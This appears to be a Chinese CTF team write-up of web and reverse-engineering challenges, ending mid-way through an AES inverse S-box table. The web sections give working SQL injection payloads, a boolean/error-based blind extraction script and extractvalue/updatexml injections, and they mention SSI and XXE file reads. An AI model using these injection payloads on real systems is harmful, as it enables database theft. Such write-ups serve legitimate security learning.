刚打完这个比赛，整理了一下队伍的wp，感谢大手子们带飞，不得不说密码学的题属实有点难了，清华的大师傅都差点没做出来
# web
## SimpleBlog
主页提示和成绩为0有关  
登录进去看到提示:  
可能是二次注入或者文件包含，但是怎么都没找到文件包含的点  
有答题的界面 分数是随机的，就算点同一个选项也不会是相同的分数，但是成绩不会是0  
测试在用户名为 admin'时，注册登录后答题分数时0，但是有#号不会是0，猜想只有数据库逻辑错误分数才会是0  
可以用布尔盲注，但是对于报错的方法，我用的是exp(),可以本地测试一下  
图中可以知道 extractvalue在逻辑上总会报错，无论前面条件是否正确  
而exp只有在前面条件正确时才会报错,根据这一点 写出脚本
    import requests,re
    import string
    register_url = "http://210.32.4.20/register.php"
    login_url = "http://210.32.4.20/login.php"
    answer_url = "http://210.32.4.20/answer.php"
    guess = "}{_"+string.digits+string.ascii_letters+"!@#$"
    flag = ""
    for i in range(1,50):
    print "round: "+ str(i)
    for j in guess:
    print "[+]testing: "+j
    tmp = ord(j)
    payload = "1' and if((ascii(substr((select flag from flag),{},1))={}),exp(~(select * from(select user())a)),1)#"
    print payload.format(i,tmp)
    data1 = {
    "username" : payload.format(i,tmp),
    "password" : "aaa"
    }
    data2 = {
    "9.d":"on"
    }
    re = requests.session()
    tt=re.post(register_url,data=data1)
    re.post(login_url,data=data1)
    res = re.post(answer_url,data2)
    # print res.text
    if "" in res.text:
    flag = flag+j
    break
    print "flag: "+flag
最后得到flag:  
## SimpleServerInjection
题目提示是ssi注入，flag在当前目录下，百度一篇文章[安全脉搏](https://www.secpulse.com/archives/66934.html)就有payload:  
修改文件名为flag即可  
## SimpleExtensionExplorerInjection
题目提示XXE flag在根目录下  
抓个包  
修改connntent-type 和post内容即可得到flag  
## SimplePrintEventLogger
看题目环境是和上一题一样，感觉完全可以用上一题方法做  
读一下根目录有什么文件  
发现了 flagvvvvvaaaagegsgag2333 文件  
读一下  
## SimpleBBS
这个题当时卡了一下，因为当时只是在验证了在注册的时候的注入，但是服务器在注册脚本中写了过滤单引号之类的，一直无法绕过，最后尝试了一下登陆的注入，发现竟然没有过滤，然后报错注入得到结果。  
payload:
    admin'union select (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)))#
发现只爆出了flag的一部分  
然后substr得到后面的结果:  
payload:
    admin'union select (updatexml(1,concat(0x7e,substr((select flag from flag),28,50),0x7e),1))#
# RE(队友解出)
## re1
输入flag后进入sub_400647（）进行校验  
进去先异或解密函数  
然后进去之后又会发现里面还有解密函数，受不了了，开始动态调，并且在flag下断点  
接着就运行到读取flag的地方了，这是对flag的第一个字符进行处理计算，格式类似于
    v0 = 101 * flag[6] + 101 * flag[6] * flag[6] + 13 * flag[6] * flag[6] * flag[6] + 25
    if ( v0 == 22215400 ):
然后还有比较验证，这里写脚本跑。  
    for i in range(0x20,0x7f):
        tmp = i
        v0 = 34 * tmp + 3 * tmp * tmp + 120 * tmp * tmp * tmp + 12
        if v0 == 39437721:
            print chr(i)
            break
后面都是重复同样的解密一段代码，然后对flag的一个字符进行判断，满足条件则对下一个字符进行验证，如此反复  
解密的脚本如下：
    start = 0x419DD4
    end = 0x419F85 
    for i in range(end - start):
        byte = get_byte(start+i)
        p_byte = byte ^ 0x13
        patch_byte(start+i,p_byte)
重复了52次总算是到了最后一个验证函数了（出题人真狠）  
对52个字符进行逐位爆破，得到最终的flag，部分脚本如下（总共300多行··…….）：
    for flag[47] in range(0x20, 0x7f):
          v0 = 50 * flag[47] + 22 * flag[47] * flag[47] + 55 * flag[47] * flag[47] * flag[47] + 41
          if ( v0 == 83944866 ):
              flag[47] = chr(flag[47])
              break
    for flag[48] in range(0x20, 0x7f):
          v0 = 77 * flag[48] + 42 * flag[48] * flag[48] + 119 * flag[48] * flag[48] * flag[48] + 110
          if ( v0 == 134321206 ):
              flag[48] = chr(flag[48])
              break
    for flag[49] in range(0x20, 0x7f):
          v0 = 91 * flag[49] + 38 * flag[49] * flag[49] + 126 * flag[49] * flag[49] * flag[49] + 64
          if ( v0 == 146289319 ):
              flag[49] = chr(flag[49])
              break
    for flag[50] in range(0x20, 0x7f):
          v0 = 113 * flag[50] + 113 * flag[50] * flag[50] + 119 * flag[50] * flag[50] * flag[50] + 22
          if ( v0 == 168616582 ):
              flag[50] = chr(flag[50])
              break
    for flag[51] in range(0x20, 0x7f):
      v0 = 24 * flag[51] + 88 * flag[51] * flag[51] + 98 * flag[51] * flag[51] * flag[51] + 30
      if ( v0 == 192784280 ):
          flag[51] = chr(flag[51])
          break
    # for flag[52] in range(0x20, 0x7f):
    #       v0 = 96 * flag[52] + 12 * flag[52] * flag[52] + 74 * flag[52] * flag[52] * flag[52] + 104
    #       if (v0 == 104):
    #           flag[52] = chr(flag[52])
    #           break
    flag = ''.join(flag)
    print("flag= "+flag)
最后得到的flag：  
EIS{you_should_go_for_nascondino_world_championship}
## Tailbone
这里本来想修改为Intel的另一条指令aesdec，没想到兜了好大的圈子。  
我们可以看到对于单轮运算，使用aesdec是逆不过来的。  
所以我们必须对于每一步运算进行如下运算
    xor_key
    inv_mix_columns
    inv_shift_rows
    inv_sub_bytes
参考github上AES的实现，写出如下脚本:
    import binascii       
        inv_s_box = (  
            0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,  
            0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,  
            0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,  
            0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,  
            0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,  
            0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,  